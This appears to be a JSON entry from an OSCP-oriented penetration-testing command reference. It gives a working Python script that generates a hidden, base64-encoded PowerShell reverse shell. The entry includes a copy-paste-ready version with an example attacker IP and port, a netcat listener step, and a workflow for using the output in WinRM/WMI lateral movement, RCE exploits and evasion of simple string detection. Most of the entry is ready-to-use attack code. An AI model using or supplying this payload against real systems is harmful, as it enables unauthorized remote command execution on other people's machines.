{
  "commands": [
    {
      "id": "ps-reverse-shell-encoder-python",
      "name": "Python Script - PowerShell Reverse Shell Base64 Encoder",
      "description": "Python script to generate base64-encoded PowerShell reverse shell with custom LHOST/LPORT",
      "command": "python3 encode.py",
      "category": "SHELLS",
      "subcategory": "PAYLOAD_GENERATION",
      "os": "LINUX",
      "script_content": "import sys\nimport base64\n\npayload = '$client = New-Object System.Net.Sockets.TCPClient(\"<LHOST>\",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\ncmd = \"powershell -nop -w hidden -e \" + base64.b64encode(payload.encode('utf16')[2:]).decode()\n\nprint(cmd)",
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attacker IP address for reverse connection (replace in script before running)",
          "example": "192.168.118.2",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Attacker listening port for reverse connection (replace in script before running)",
          "example": "443",
          "required": true
        }
      ],
      "examples": [
        {
          "command": "# Save script as encode.py, modify LHOST/LPORT, then run:\npython3 encode.py",
          "description": "Generate base64 payload connecting to 192.168.118.2:443",
          "context": "Prepare reverse shell before lateral movement"
        },
        {
          "command": "# Example script with custom values:\nimport sys\nimport base64\n\npayload = '$client = New-Object System.Net.Sockets.TCPClient(\"192.168.118.2\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\ncmd = \"powershell -nop -w hidden -e \" + base64.b64encode(payload.encode('utf16')[2:]).decode()\n\nprint(cmd)",
          "description": "Complete script example with LHOST=192.168.118.2 and LPORT=443",
          "context": "Copy-paste ready script"
        }
      ],
      "educational": {
        "purpose": "Automate creation of properly encoded PowerShell reverse shell payloads. Handles UTF-16LE encoding and base64 conversion required by PowerShell -EncodedCommand flag.",
        "manual_alternative": "Manual base64 encoding: echo -n '<PAYLOAD>' | iconv -t UTF-16LE | base64 -w 0 (error-prone with special characters)",
        "common_failures": [
          "Forgetting to modify <LHOST> and <LPORT> placeholders before running script",
          "Using wrong encoding (UTF-8 instead of UTF-16LE) causes PowerShell decode errors",
          "Not removing BOM (Byte Order Mark) with [2:] slice results in malformed payload"
        ],
        "when_to_use": [
          "Before WinRM/WMI lateral movement when reverse shell needed",
          "Generating payloads for command injection or RCE exploits",
          "Creating obfuscated PowerShell commands to bypass simple string detection",
          "OSCP exam prep - pre-generate payloads for common scenarios"
        ],
        "exam_relevance": "HIGH - Save time during OSCP exam by having encoder script ready. Generate custom payloads in seconds rather than manual encoding.",
        "time_estimate": "<5 seconds to generate payload",
        "technical_notes": [
          "payload.encode('utf16') adds BOM - [2:] removes first 2 bytes (BOM)",
          "PowerShell -EncodedCommand expects UTF-16LE base64 encoding",
          "Output is complete command ready for copy-paste to WinRM/WMI commands",
          "Script handles escaping automatically - no manual quote escaping needed"
        ]
      },
      "oscp_priority": "HIGH",
      "tags": [
        "PYTHON",
        "POWERSHELL",
        "REVERSE_SHELL",
        "PAYLOAD_GENERATION",
        "BASE64",
        "OSCP:HIGH"
      ],
      "related_commands": [
        "ps-reverse-shell-base64",
        "ps-winrm-invoke-command",
        "ps-wmi-invoke-method",
        "nc-listener"
      ],
      "usage_workflow": [
        "1. Save script as encode.py on Kali attacker machine",
        "2. Edit script: Replace <LHOST> with attacker IP, <LPORT> with listener port",
        "3. Run: python3 encode.py",
        "4. Copy output (full powershell -nop -w hidden -e ... command)",
        "5. Set up listener: nc -lnvp <LPORT>",
        "6. Use output as payload in WinRM/WMI lateral movement commands"
      ]
    }
  ]
}
